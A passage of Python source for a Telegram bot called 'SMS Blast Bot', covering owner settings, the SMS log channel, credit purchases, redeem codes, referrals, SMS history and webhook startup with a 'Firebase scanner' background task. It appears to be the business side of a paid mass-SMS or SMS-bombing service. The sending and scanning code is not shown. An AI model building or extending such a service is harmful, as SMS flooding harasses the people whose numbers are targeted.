        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient! Balance: {get_user_credits(uid, d)}", reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


# ============================================================
# SETTINGS / ACTIVITY / SMS HISTORY
# ============================================================

@R.callback_query(F.data == "owner:sms_log")
async def owner_sms_log_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    settings = d.setdefault("settings", {})
    target = settings.get("sms_log_chat_id")
    link = settings.get("sms_log_link", "")
    status = f"🟢 Configured: <code>{escape(str(target))}</code>" if target else "🔴 Not configured"
    await cq.message.edit_text(
        f"{DIVIDER}\n📥 <b>SMS LOG CHANNEL</b>\n{DIVIDER}\n\n"
        f"Status: {status}\n"
        f"Link: {escape(link) if link else '—'}\n\n"
        f"<i>Format: chat_id | channel/group link\nExample: -1001234567890 | https://t.me/mychannel\n\nPrivate groups ke liye bot ko admin banayein. ‘off’ se logging band ho jayegi.</i>\n"
        f"{DIVIDER}",
        reply_markup=kb([("sᴇᴛ ʟᴏɢ ᴄʜᴀɴɴᴇʟ", "owner:sms_log:set"), ("ᴜɴsᴇᴛ / ᴏғғ", "owner:sms_log:off"), ("ʙᴀᴄᴋ", "owner:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@R.callback_query(F.data == "owner:sms_log:set")
async def owner_sms_log_set_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.set_sms_log)
    await cq.message.edit_text(
        f"{DIVIDER}\n📥 <b>SET SMS LOG CHANNEL</b>\n{DIVIDER}\n\n"
        f"Chat ID aur link bhejein: <code>chat_id | link</code>\n"
        f"Example: <code>-1001234567890 | https://t.me/mychannel</code>",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:sms_log")]),
        parse_mode="HTML"
    )


@R.message(S.set_sms_log)
async def owner_sms_log_set_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    raw = (msg.text or "").strip()
    if raw.lower() == "off":
        d.setdefault("settings", {})["sms_log_chat_id"] = None
        d["settings"]["sms_log_link"] = ""
        save(d)
        await state.clear()
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} SMS logging off kar di gayi.", reply_markup=owner_kb(d), parse_mode="HTML")
        return
    parts = [part.strip() for part in raw.split("|", 1)]
    target = parts[0]
    link = parts[1] if len(parts) > 1 else ""
    if not target or not (target.startswith("-") or target.startswith("@") or target.lstrip("+").isdigit()):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid chat ID bhejein, jaise <code>-1001234567890</code>.", parse_mode="HTML")
        return
    if target.lstrip("+").isdigit() or (target.startswith("-") and target[1:].isdigit()):
        target_value = int(target)
    else:
        target_value = target
    d.setdefault("settings", {})["sms_log_chat_id"] = target_value
    d["settings"]["sms_log_link"] = link
    save(d)
    await state.clear()
    await msg.answer(
        f"{DIVIDER}\n{em(EMOJI_CHECK, '✅')} <b>SMS LOG CHANNEL SAVED</b>\n{DIVIDER}\n\n"
        f"Target: <code>{escape(str(target_value))}</code>\nLink: {escape(link) if link else '—'}",
        reply_markup=owner_kb(d), parse_mode="HTML", disable_web_page_preview=True
    )


@R.callback_query(F.data == "owner:sms_log:off")
async def owner_sms_log_off(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    d.setdefault("settings", {})["sms_log_chat_id"] = None
    d["settings"]["sms_log_link"] = ""
    save(d)
    await cq.answer("SMS logging off kar di gayi.", show_alert=True)
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")


@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})
    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>sᴇᴛᴛɪɴɢs</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 5)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁", style="success")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"{em(EMOJI_GIFT, '🎁')} <b>sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs</b>\n\nKitne credits?", reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "owner:settings")]), parse_mode="HTML")


@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Ref credits: <b>{credits}</b>", reply_markup=kb([("ʙᴀᴄᴋ", "owner:settings")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            lines.append(f"[{ts}] <code>{entry.get('uid')}</code> — <b>{entry.get('action')}</b>")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([("ʀᴇғʀᴇsʜ", "owner:activity"), ("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())
    text = f"{em(EMOJI_STAR, '📋')} <b>ɢʟᴏʙᴀʟ sᴍs ʜɪsᴛᴏʀʏ</b>\n\nTotal: <b>{total_entries}</b>"
    await cq.message.edit_text(text, reply_markup=kb([("ʙᴀᴄᴋ", "owner:home")]), parse_mode="HTML")


# ============================================================
# USER HOME / REDEEM / REFER / STATS / HISTORY / PRICING / INFO
# ============================================================

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return
    if not can_use(uid, d):
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '⛔')} Access nahi!", parse_mode="HTML")
        return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")


@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}", show_alert=True)


@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ</b>\n\nApna code enter karein:",
        reply_markup=kb([("ᴄᴀɴᴄᴇʟ", "user:home")]),
        parse_mode="HTML"
    )


@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid code!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
        return
    code_data = codes[code]
    if code_data.get("uses_left", 0) <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Code expired!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
        return
    if uid in code_data.get("used_by", []):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Already used!", reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]), parse_mode="HTML")
        return
    credits = code_data["credits"]
    add_credits(uid, credits, d)
    code_data["uses_left"] = code_data.get("uses_left", 1) - 1
    code_data.setdefault("used_by", []).append(uid)
    save(d)
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeemed!</b>\n\n+{credits} credits\nBalance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([("ʜᴏᴍᴇ", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_GIFT, '🎁')} <b>ʀᴇғᴇʀ & ᴇᴀʀɴ</b>\n\nHar referral: <b>{ref_credits}</b> credits\n\n"
        f"Code: <code>{code}</code>\nLink: https://t.me/{me.username}?start={code}",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>ʏᴏᴜʀ sᴛᴀᴛs</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML"
    )


@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Koi SMS nahi bheja.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            status = entry.get("status", "unknown")
            icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {icon} <code>{mask_number(num)}</code>")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]), parse_mode="HTML")


@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True)
        return
    text = f"{em(EMOJI_MONEY, '💰')} <b>ʙᴜʏ ᴄʀᴇᴅɪᴛs</b>\n\n"
    rows = []
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b> — {plan['price']} INR = {plan['credits']} credits\n"
        rows.append([btn_url(f"ʙᴜʏ {plan['name'][:20]}", plan['payment_link'], EMOJI_MONEY, "💳", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{OWNER_LINK}'>{OWNER_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner\n\n"
        f"<i>Referral se free credits paayein!</i>",
        reply_markup=kb([("ʙᴀᴄᴋ", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )


@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()


# ============================================================
# MAIN
# ============================================================

WEBHOOK_PATH = "/telegram/webhook"


async def health_check(request: web.Request) -> web.Response:
    """Public health endpoint for Render; does not expose bot state."""
    return web.Response(text="ok", status=200)


def _validate_webhook_config() -> tuple[str, str, int]:
    base_url = os.getenv("RENDER_EXTERNAL_URL", "").strip().rstrip("/")
    secret = os.getenv("WEBHOOK_SECRET", "").strip()
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN environment variable is required.")
    if not base_url.startswith("https://"):
        raise RuntimeError("RENDER_EXTERNAL_URL must be set to this Render Web Service HTTPS URL.")
    if not secret or len(secret) > 256 or any(c not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" for c in secret):
        raise RuntimeError("Set WEBHOOK_SECRET to a random 1-256 character value using only letters, digits, _ or -.")
    return base_url, secret, _env_int("PORT", 10000)


def main():
    # Ensure SQLite schema exists and migrate the legacy JSON before accepting updates.
    load()
    base_url, webhook_secret, port = _validate_webhook_config()
    bot = QuotedBot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    scanner_task = None

    async def on_startup(bot: Bot):
        nonlocal scanner_task
        webhook_url = f"{base_url}{WEBHOOK_PATH}"
        await bot.set_webhook(
            url=webhook_url,
            secret_token=webhook_secret,
            allowed_updates=dp.resolve_used_update_types(),
            drop_pending_updates=False,
        )
        me = await bot.get_me()
        log.info("@%s — SMS Blast Bot %s started in webhook mode at %s", me.username, _VERSION, webhook_url)
        scanner_task = asyncio.create_task(background_firebase_scanner(bot))
        log.info("Background scanner task created")
        try:
            await bot.send_message(
                MAIN_OWNER,
                f"{em(EMOJI_ROCKET, '🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
                f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
                f"{em(EMOJI_GEAR, '🔄')} <b>Background Scanner:</b> Starting...\n"
                f"{em(EMOJI_STAR, '👥')} <b>Per-User Sessions:</b> ENABLED\n"
                f"{em(EMOJI_ROCKET, '🚀')} <b>Concurrent Users:</b> 1000+\n"
                f"{em(EMOJI_LOCK, '🔒')} <b>Number Protection:</b> ENABLED\n"
                f"{em(EMOJI_VIDEO, '📹')} <b>Videos/Images:</b> ENABLED\n"
                f"{em(EMOJI_MONEY, '💸')} <b>Credit Transfer:</b> ENABLED\n"
                f"👤 <b>Bot Owner:</b> {OWNER_NAME}",
                parse_mode="HTML"
            )
        except Exception as e:
            log.warning("Owner notify: %s", e)

    async def on_shutdown(bot: Bot):
        nonlocal scanner_task
        if scanner_task and not scanner_task.done():
            scanner_task.cancel()
            await asyncio.gather(scanner_task, return_exceptions=True)
        log.info("Webhook service shutting down")

    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)

    app = web.Application()
    app.router.add_get("/", health_check)
    SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
        secret_token=webhook_secret,
        handle_in_background=True,
    ).register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    log.info("Binding aiohttp web server to 0.0.0.0:%s", port)
    web.run_app(app, host="0.0.0.0", port=port)


if __name__ == "__main__":
    main()
